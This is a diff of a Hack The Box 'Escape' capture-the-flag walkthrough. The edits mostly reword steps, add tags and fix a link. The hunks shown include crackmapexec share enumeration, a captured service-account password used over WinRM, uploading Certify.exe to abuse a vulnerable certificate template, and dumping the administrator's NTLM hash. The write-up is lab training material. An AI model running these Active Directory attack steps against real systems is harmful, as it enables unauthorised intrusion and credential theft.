@@ -2,7 +2,7 @@
 title: HTB - Escape
 date: 2024-01-01
 categories: [CTF, Fullpwn]
-tags: [htb, hackthebox, nmap, escape]
+tags: [htb, hackthebox, nmap, escape, certify, rubeus, smb, mssql, responder, xp_dirtree, ntlm, hash, hashcat, kerberos, tgt, psexec]
 img_path: /assets/htb/fullpwn/escape/
 published: true
 ---
@@ -14,7 +14,7 @@ published: true
 |:-:|:-:|
 |Machine|[Escape](https://app.hackthebox.com/machines/531)|
 |Rank|Medium|
-|Focus||
+|Focus|crackmapexec, certificates, kerberos|
 
 ## Information gathering
 
@@ -98,26 +98,10 @@ published: true
 
   ![](domain_names_hosts.png)
 
-3. There is an SMB port (`445`) available, so we could try enumerating it using `smbclient`:
+3. There is an SMB server on port 445 listening, so we could try enumerating that using `crackmapexec`:
 
   ```shell
-  # enumerating shares with smbclient
-  $ smbclient -N -L //escape
-
-        Sharename       Type      Comment
-        ---------       ----      -------
-        ADMIN$          Disk      Remote Admin
-        C$              Disk      Default share
-        IPC$            IPC       Remote IPC
-        NETLOGON        Disk      Logon server share
-        Public          Disk
-        SYSVOL          Disk      Logon server share
-  ```
-
-  We can also enumerate the shares along with their permissions with `crackmapexec`:
-
-  ```shell
-  # enumerating shares with cme
+  # enumerating shares and permissions with crackmapexec
   $ crackmapexec smb escape --shares -u 'test' -p ''
   SMB         escape          445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
   SMB         escape          445    DC               [+] sequel.htb\test:
@@ -133,7 +117,7 @@ published: true
   ```
   > We must pass a random username for the above command to work.
 
-4. Since we have `READ` permissions on the `Public` share we can connect to it and see what it's inside:
+4. Since we have `READ` permissions on the `Public` share we can connect to it and see what's inside:
 
   ```shell
   # connecting the to Public share
@@ -154,7 +138,7 @@ published: true
 
   ```shell
   # opening the PDF file
-  open SQL\ Server\ Procedures.pdf
+  $ open SQL\ Server\ Procedures.pdf
   ```
 
   ![](pdf_content.png)
@@ -324,7 +308,7 @@ published: true
   WINRM       escape          5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
   ```
 
-10. Since that worked, let's log into WinRM and see what we can find. One option is to use [SharpCollection](https://github.com/Flangvik/SharpCollection)'s `Certify.exe` since we know that this machine is a certified authority. 
+10. Since that worked, let's log into WinRM and see what we can find. We will use [SharpCollection](https://github.com/Flangvik/SharpCollection)'s `Certify.exe` since we know that this machine is a certified authority to check for vulnerable cert templates. 
 
   We first need to transfer the executable into the target. We can do that by directly uploading using WinRM:
 
@@ -421,9 +405,7 @@ published: true
   *Evil-WinRM* PS C:\Users\sql_svc> cd /
   *Evil-WinRM* PS C:\> ls
 
-
       Directory: C:\
-
 
   Mode                LastWriteTime         Length Name
   ----                -------------         ------ ----
@@ -439,9 +421,7 @@ published: true
   *Evil-WinRM* PS C:\> cd SQLServer
   *Evil-WinRM* PS C:\SQLServer> ls
 
-
       Directory: C:\SQLServer
-
 
   Mode                LastWriteTime         Length Name
   ----                -------------         ------ ----
@@ -454,9 +434,7 @@ published: true
   *Evil-WinRM* PS C:\SQLServer> cd Logs
   *Evil-WinRM* PS C:\SQLServer\Logs> ls
 
-
       Directory: C:\SQLServer\Logs
-
 
   Mode                LastWriteTime         Length Name
   ----                -------------         ------ ----
@@ -567,7 +545,7 @@ published: true
 
   This time it seems that it managed to find a vulnerable certificate template called `UserAuthentication`.
 
-13. We can now visit the [Certify's GitHub page] which includes details instructions on what we can do when we find a vulnerable cert template. There are 3 potential scenarios listed on this page, and we currently are on the third one (*VulnTemplate*). Luckily for us, they show the abuse of scenario 3 step by step:
+13. We can now visit the [Certify's GitHub page](https://github.com/GhostPack/Certify) which includes details instructions on what we can do when we find a vulnerable cert template. There are 3 potential scenarios listed on this page, and we currently are on the third one (*VulnTemplate*). Luckily for us, they show the abuse of scenario 3 step by step:
 
   ![](certify_github.png)
 
@@ -772,7 +750,7 @@ published: true
       + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
   ```
 
-  It seems that it failed to inject the cert into our session. We can try and get the user's NTLM hash:
+  It seems that it failed to inject the cert into our session since we can access `administrator`'s directory. We can try and get the user's NTLM hash:
 
   ```shell
   # get the credentials of the user administrator including its NTLM hash
